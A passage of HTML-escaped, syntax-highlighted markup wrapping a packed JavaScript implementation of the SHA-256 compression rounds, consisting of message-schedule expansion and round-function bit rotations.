class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">17&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span>&lt;span 